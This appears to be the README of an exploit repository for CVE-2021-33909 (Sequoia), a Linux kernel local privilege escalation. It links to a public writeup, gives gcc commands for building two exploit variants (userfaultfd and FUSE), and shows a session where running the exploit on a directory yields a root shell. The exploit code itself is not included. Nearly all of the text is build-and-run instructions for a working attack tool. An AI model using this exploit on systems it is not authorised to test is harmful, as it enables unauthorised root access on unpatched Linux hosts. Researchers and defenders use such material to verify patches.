# CVE-2021-33909 Sequoia

[Writeup](https://blog.qualys.com/vulnerabilities-threat-research/2021/07/20/sequoia-a-local-privilege-escalation-vulnerability-in-linuxs-filesystem-layer-cve-2021-33909)

```bash
gcc exploit.c -o exploit -lpthread -DBLOCK_VIA_USERFAULTFD
gcc exploit.hello.c -o exploit.hello -lpthread -lfuse -D_FILE_OFFSET_BITS=64
```

```bash
$ mkdir dir
$ ./exploit $(pwd)/dir
# id
```